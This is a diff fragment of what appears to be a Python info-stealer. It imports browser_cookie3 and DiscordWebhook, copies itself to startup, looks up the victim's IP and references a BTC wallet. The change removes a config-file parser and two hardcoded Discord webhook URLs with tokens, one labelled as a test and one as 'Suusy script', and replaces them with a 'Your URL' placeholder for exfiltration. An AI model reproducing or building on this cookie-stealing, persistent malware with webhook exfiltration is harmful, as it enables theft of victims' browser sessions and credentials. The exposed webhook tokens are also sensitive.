@@ -1,4 +1,3 @@
-#Import libraries
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import browser_cookie3
 from urllib.request import urlopen
@@ -54,28 +53,9 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
-def parse_saved_variables():
-    variables = {}
-    with open(os.path.join(sys.path[0], "saved_variables.txt"), "r") as file:
-        for line in file:
-            line = line.strip()
-            if not line:
-                continue  # Skip empty lines
-            if ": " not in line:
-                continue
-            key, value = line.split(": ", 1)
-            variables[key] = value
-    return variables
 
-parsed_variables = parse_saved_variables()
-# Access the individual variables from the parsed dictionary
-webhook_url = parsed_variables.get("Webhook URL")
-copy_to_start_up = parsed_variables.get("Copy to startup?")
-btc_wallet = parsed_variables.get("BTC wallet")
 
-webhook = DiscordWebhook(url=f'{webhook_url}')#Set up webhook
-#test #https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02
-#Suusy script https://discord.com/api/webhooks/1131994203019284581/S5wolQDreb40kHiaGO_qTSM4Ezs9MxH1MQrASxVu7Ko7k6R39G_p0y-cJy5UQKnqy81o
+webhook = DiscordWebhook(url='Your URL')#Set up webhook
 def ip4():#Get ipv4
     try:
      with urlopen('https://4.ident.me') as response:
